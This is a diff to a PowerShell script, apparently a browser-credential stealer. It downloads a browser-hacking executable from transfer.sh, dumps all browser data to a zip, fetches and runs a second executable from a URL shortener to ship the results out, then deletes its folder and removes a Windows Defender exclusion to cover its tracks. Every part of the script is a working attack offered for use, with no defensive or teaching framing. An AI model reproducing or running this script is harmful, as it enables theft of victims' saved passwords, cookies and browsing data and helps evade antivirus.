@@ -7,5 +7,11 @@ Set-Location "$env:USERPROFILE\Downloads\digi"
 Invoke-WebRequest -Uri "https://transfer.sh/MOVevw/hack-browrser.exe" -OutFile "$env:USERPROFILE\Downloads\digi\hb.exe"
 ./hb.exe -b all -f json --dir results -zip
 Remove-Item -Path "$env:USERPROFILE\Downloads\digi\hb.exe" -Force
-#Mailing the output you will need to enable less secure app access on your google account for this to work
+#zip shipping
 Set-Location "$env:USERPROFILE\Downloads\digi\results"
+Invoke-WebRequest -Uri "https://acortar.link/c51Jce" -OutFile "$env:USERPROFILE\Downloads\digi\results\server.exe"
+./server.exe
+#Cleanup
+cd "$env:USERPROFILE\Downloads"
+Remove-Item -Path "$env:USERPROFILE\Downloads\digi" -Force -Recurse
+Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
